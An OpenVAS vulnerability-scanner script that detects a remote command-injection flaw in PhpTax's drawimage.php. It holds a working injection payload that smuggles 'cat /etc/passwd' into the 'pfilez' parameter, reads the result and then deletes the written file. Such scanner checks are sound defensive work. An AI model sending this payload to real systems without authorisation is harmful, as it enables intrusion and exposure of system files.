###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phptax_55759.nasl 12 2013-10-27 11:15:33Z jan $
#
# PhpTax 'drawimage.php' Remote Arbitrary Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "PhpTax is prone to a remote arbitrary command-execution vulnerability
because it fails to properly validate user-supplied input.

 An attacker can exploit this issue to execute arbitrary commands
 within the context of the vulnerable application.

PhpTax 0.8 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103582";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(55759);
 script_tag(name:"cvss_base", value:"9.7");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:C");
 script_version ("$Revision: 12 $");

 script_name("PhpTax 'drawimage.php' Remote Arbitrary Command Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/55759");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-10-09 14:42:33 +0200 (Tue, 09 Oct 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to execute a command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/phptax","/tax",cgi_dirs());

foreach dir (dirs) {
   
  url = dir + '/index.php'; 

  if(http_vuln_check(port:port, url:url,pattern:"<title>PHPTAX")) {

    file = 'openvas_' + rand() + '.txt';
    ex = 'xx%3bcat+%2Fetc%2Fpasswd+%3E+.%2F' + file  + '%3b';
    url = dir + '/drawimage.php?pdf=make&pfilez=' + ex;

    if(http_vuln_check(port:port, url:url,pattern:"image/png",check_header:TRUE)) {

      url = dir + '/' + file;

      if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:",check_header:TRUE)) {

        url = dir + '/drawimage.php?pdf=make&pfilez=%3Brm+.%2F' + file  + '%3B';
        http_vuln_check(port:port, url:url,pattern:"none");

        security_hole(port:port);
        exit(0);
      }  


    }  
     

  }
}

exit(0);
